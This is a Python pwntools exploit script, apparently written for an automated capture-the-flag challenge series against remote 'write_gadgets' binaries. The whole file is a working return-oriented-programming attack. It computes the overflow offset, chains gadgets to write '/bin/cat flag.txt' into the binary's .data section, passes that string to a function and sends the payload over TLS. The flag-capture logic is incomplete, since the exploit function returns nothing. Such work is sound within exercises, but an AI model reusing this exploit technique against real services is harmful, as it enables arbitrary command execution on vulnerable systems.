from pwn import *
import detection
import re

# context.log_level = 'ERROR'
# logging.disable(logging.CRITICAL)

context.update(
    arch="amd64",
    endian="little",
    log_level="warning",
    os="linux",
    # terminal=["tmux", "split-window", "-h", "-p 65"]
    terminal=["st"]
)


def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    if p:
        print('[+] Connected to host')
    e = ELF(binary)
    r = ROP(e)
    flagtxt = b'/bin/cat flag.txt'
    ret = r.find_gadget(['ret'])[0]
    offset = detection.find_rip_offset(binary)
    print("[+] Offset:", offset)
    # p.recvuntil(b'>>>')
    #payload = b''
    payload = cyclic(offset)
    payload += p64(ret)
    print(payload)
    try:
        pop_r14_15 = r.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
        print(f"[+] pop r14/15 found at {hex(pop_r14_15)}")
        payload += p64(pop_r14_15)
    except:
        print('[!] pop r14/15 not found')

    try:
        data_section = e.get_section_by_name(".data").header.sh_addr
        print(f"[+] Data section found at {hex(data_section)}")
        payload += p64(data_section) + flagtxt
    except:
        print('[!] data_section not found? what LMAO')
    print(payload)
    try:
        mov_r14_r15 = e.sym['gadget3']
        print(f"[+] Mov r14/15 gadget found at {hex(mov_r14_r15)}")
        payload += p64(mov_r14_r15)
    except:
        print('[!] mov r14/15 not found')

    try:
        pop_rdi = r.find_gadget(['pop rdi','ret'])[0]
        print(f"[+] Pop RDI found at {hex(pop_rdi)}")
        payload += p64(pop_rdi)
    except:
        print('[!] pop rdi not found')
    payload += p64(data_section)
    try:
        func = e.sym['func']
        print(f"[+] func found at {hex(func)}")
        payload += p64(func)
    except:
        print('[!] func not found')
    print(payload)
    p.sendline(payload)


def main():  # TEMP FOR TESTING
    for i in range(10):
        print(f"bin-write_gadgets-{i}")
        flag = exploit(f"bin-write_gadgets-{i}")
        print(f"\n[!]{flag}\n")


main()
